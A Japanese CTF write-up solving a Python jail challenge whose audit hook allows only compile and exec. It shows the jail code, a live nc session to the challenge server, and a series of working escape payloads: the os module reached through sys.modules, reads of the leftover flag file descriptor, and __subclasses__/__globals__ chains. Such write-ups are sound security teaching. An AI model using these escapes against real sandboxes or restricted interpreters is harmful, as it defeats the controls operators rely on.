# unhead

## / Overview

sysからos呼び出し → os.read()によるFD読み取り

## / Writeup

pyjail の問題です．`jail.py`のexec()関数でRCEもしくはフラグを読むペイロードを発火させることを目的にします．

```py
import sys
import os

# Hint1: sys.addaudithook() registers a callback that Python invokes on security-sensitive operations (file opens, imports, exec, etc.).
# ヒント1: sys.addaudithook()は、セキュリティ上重要な操作（ファイルのオープン、インポート、execなど）の際にPythonが呼び出すコールバックを登録します。

# Hint2: Audit hooks are PERMANENT, once installed they cannot be removed or bypassed from Python code.  ...or can they?
# ヒント2: 監査フックは永続的であり、一度設定されるとPythonコードから削除もバイパスもできません。…本当にそうでしょうか？

_flag_fd = os.open("flag.txt", os.O_RDONLY)

del os

code = input("> ")

_ALLOWED = frozenset({"compile", "exec"})


def _audit_hook(event, _args, _allowed=_ALLOWED):
    if event not in _allowed:
        raise PermissionError(f"blocked: {event}")


sys.addaudithook(_audit_hook)

del _flag_fd, _audit_hook, _ALLOWED

try:
    exec(compile(code, "<jail>", "exec"), {"__builtins__": __builtins__, "sys": sys})
except Exception as e:
    print(f"error: {e}")
```

チャレンジは

- フラグの中身を`_flag_fd`に格納
- `sys.addaudithook(_audit_hook)`で監査ルールを追加
- 変数`_flag_fd`, `_audit_hook`, `_ALLOWED`を削除
- `exec()`で実行されるPythonコードを`__builtins__`と`sys`に限定

という流れになっています．

中でも見慣れない`sys.addaudithook(_audit_hook)`は，[監査対象のイベント](https://docs.python.org/ja/3.13/library/audit_events.html)が発生した時に`_audit_hook`関数を実行するようにフックを追加しています．監査対象のイベントはOSやシステム環境にアクセスするような**権限の強い関数**が対象になっています．

今回は監査対象イベント発生時に，その関数が`exec()`と`compile()`以外だとプログラムが終了します．

この条件下でも発火するペイロードを作るべく，audit hooks を扱ったCTFのWriteupを調べました．その一部を引用します．

> [DiceCTF 2024] IRS
> 
> https://maplebacon.org/2024/02/dicectf2024-irs/
>
> ""
> The first thing we learned is that audit hooks are not a joke. As in, they are a lot harder to bypass than one might suspect. There are some useful built-ins for jailbreaking, like `breakpoint()`, `open()` and `exec()`, but the audit blocks them all. It also blocks many standard library functions - especially shell functions like `os.system`.
> There do exist some potentially dangerous library functions that the audit hook does not detect (such as ctypes), but in fact, imports are audited too! Only **modules that have been loaded at runtime (a.k.a. those in `sys.modules`) do not trigger the audit event. We can import stuff like os and sys**, but anything useful to get us an RCE is annoyingly out of reach.
> ""

結論から言うと，今回のペイロードはここから着想を得ました．このWriteupでは`sys.modules`を経由することで`os`をimportできてかつ，この関数は監査対象のイベントではないと書かれています．フラグを保持する変数`_flag_fd`が削除されていても，`os`が使えるなら別の方法で読む方法があるんじゃないでしょうか．

ということで，まずは本当に`os`が呼び出せるか調べてみます．

```sh
$ nc 34.170.146.252 7977
> print(sys.modules)
{'sys': <module 'sys' (built-in)>, 
'builtins': <module 'builtins' (built-in)>, '_frozen_importlib': <module '_frozen_importlib' (frozen)>,
'_imp': <module '_imp' (built-in)>, 
'_thread': <module '_thread' (built-in)>, 
# --snip--
'os.path': <module 'posixpath' (frozen)>,
'os': <module 'os' (frozen)>,  # 発見
'_sitebuiltins': <module '_sitebuiltins' (frozen)>, 
'site': <module 'site' (frozen)>}
```

呼び出せそうなので，次にどの様な関数が使えるか見てみます．

```sh
$ nc 34.170.146.252 7977
> print(dir(sys.modules['os']))
['CLD_CONTINUED', 'CLD_DUMPED', 'CLD_EXITED', 'CLD_KILLED', 'CLD_STOPPED', 'CLD_TRAPPED', 'CLONE_FILES', 'CLONE_FS', 
# --snip--
,'wait', 'wait3', 'wait4', 'waitid', 'waitid_result', 'waitpid', 'waitstatus_to_exitcode', 'walk', 'write', 'writev']
```

計427個の関数が使えそうです．この中にファイルを読めそうな関数を探します．`read`という文字列に絞った結果，次の関数が残りました．

- `os.read()`
- `os.pread()`
- `os.readv()`
- `os.preadv()`

仕様を確認すると，`os.read()`は第１引数に **ファイルディスクリプタ, fd**を，第２引数にバイト数を指定してデータを読むみたいです．実はこれが今回のチャレンジに刺さっていて，`del _flag_fd`で変数を消していても，**fdはプログラムが終了するまで残り続けます．**

そのため，fd=3 (0=標準入力，1=標準出力，2=エラー出力 の次) を読み込めばフラグが取得できます．

```sh
$ nc 34.170.146.252 7977
> print(sys.modules['os'].read(3, 100))
b'Alpaca{4ud1t_h00ks_c4nt_s33_3v3ryth1ng}'
```

ちなみに他のread系の関数に加えて，以下のように様々なペイロードが組めるようです．(by Gemini, 動作確認済み)

> os.pread()
```py
print(sys.modules['os'].pread(3, 100, 0))
```

> os.readv()
```py
print([b := bytearray(100), sys.modules['os'].readv(3, [b]), b])
```

> os.preadv()
```py
print([b := bytearray(100), sys.modules['os'].preadv(3, [b], 0), b])
```

> os.sendfile()
```py
sys.modules['os'].sendfile(1, 3, 0, 100)
```

> os.dup2()
```py
sys.modules['os'].dup2(3, 0); print(sys.stdin.read())
```

> posix.read()
```py
print(sys.modules['posix'].read(3, 100))
```

関数としては新しくないのですが，いつもみたいに`__globals__`を使ったチェーンも作れるようです．

> チェーン1
```py
print([c for c in ().__class__.__bases__[0].__subclasses__() if c.__name__ == '_wrap_close'][0].__init__.__globals__['pread'](3, 100, 0))
```

> チェーン2
```py
print([c for c in ().__class__.__bases__[0].__subclasses__() if c.__name__ == 'Quitter'][0].__init__.__globals__['sys'].modules['os'].pread(3, 100, 0))
```